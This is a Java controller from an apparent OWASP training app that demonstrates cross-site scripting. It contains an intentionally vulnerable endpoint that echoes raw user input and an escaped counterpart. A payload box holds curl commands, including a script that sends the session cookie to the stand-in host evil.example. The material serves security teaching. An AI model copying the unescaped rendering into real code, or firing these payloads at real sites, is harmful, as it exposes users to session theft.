package com.owasp.demo.controller;

import com.owasp.demo.util.Messages;
import com.owasp.demo.view.TemplateEngine;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.IOException;
import java.util.Map;

@Controller
public class XssHandler {

    @GetMapping("/xss")
    public void page(HttpServletRequest req, HttpServletResponse res) throws IOException {
        renderPage(res, null, null, null, null);
    }

    @PostMapping("/xss/vulnerable")
    private void handleVulnerable(HttpServletRequest req, HttpServletResponse res) throws IOException {
        String input = req.getParameter("comment");
        renderPage(res, input, input, null, null);
    }

    @PostMapping("/xss/mitigated")
    private void handleMitigated(HttpServletRequest req, HttpServletResponse res) throws IOException {
        String input = req.getParameter("comment2");
        renderPage(res, null, null, input, TemplateEngine.escape(input));
    }

    private void renderPage(HttpServletResponse res,
                            String vulnInput, String vulnOutput,
                            String safeInput, String safeOutput) throws IOException {
        String info = TemplateEngine.infoBox(
            Messages.get("xss.info.explanation"),
            Messages.get("xss.info.mitigation")
        );

        String xssPayload = "<script>alert('XSS')</script>";

        String vulnForm = TemplateEngine.render("forms/xss-vulnerable.html", Map.of(
            "payload", TemplateEngine.escape(xssPayload),
            "value", TemplateEngine.escape(vulnInput != null ? vulnInput : ""),
            "output", vulnOutput != null
                    ? "<div class='mt-3 p-3 bg-red-50 border border-red-200 rounded text-sm'><strong>Rendered output:</strong><br/>" + vulnOutput + "</div>"
                    : ""
        ));

        String safeForm = TemplateEngine.render("forms/xss-mitigated.html", Map.of(
            "payload", TemplateEngine.escape(xssPayload),
            "value", TemplateEngine.escape(safeInput != null ? safeInput : ""),
            "output", safeOutput != null
                    ? "<div class='mt-3 p-3 bg-green-50 border border-green-200 rounded text-sm'><strong>Rendered output (escaped):</strong><br/>" + safeOutput + "</div>"
                    : ""
        ));

        String panels = """
            <div class="grid md:grid-cols-2 gap-6">
              %s
              %s
            </div>
            """.formatted(
                TemplateEngine.demoPanel(Messages.get("xss.panel.vulnerable"), "red", vulnForm, ""),
                TemplateEngine.demoPanel(Messages.get("xss.panel.mitigated"), "green", safeForm, "")
            );

        String exploits = TemplateEngine.exploitBox(new String[][]{
            {"Basic alert", "<script>alert('XSS')</script>",
             "Classic proof-of-concept — pops an alert box in the victim's browser.", "comment",
             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"comment=<script>alert('XSS')</script>\""},
            {"Cookie theft", "<script>document.location='http://evil.example/steal?c='+document.cookie</script>",
             "Exfiltrates the session cookie to an attacker-controlled server.", "comment",
             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"comment=<script>document.location='http://evil.example/steal?c='+document.cookie</script>\""},
            {"DOM manipulation", "<img src=x onerror=\"document.body.style.background='red'\">",
             "Uses an invalid src to trigger onerror, then alters the page DOM.", "comment",
             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'comment=<img src=x onerror=alert(1)>'"},
            {"Stored payload", "<script>document.title='Hacked by XSS'</script>",
             "Runs as the victim and changes the tab title. A stored script can do anything the user can do. The session stays alive.", "comment",
             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"comment=<script>document.title='Hacked by XSS'</script>\""},
        });

        String content = TemplateEngine.vulnerabilityBadge(Messages.get("xss.badge.id"), Messages.get("xss.badge.name"), Messages.get("xss.badge.tag")) + info + exploits + panels;
        res.getWriter().write(TemplateEngine.page(Messages.get("xss.title"), content, true));
    }
}
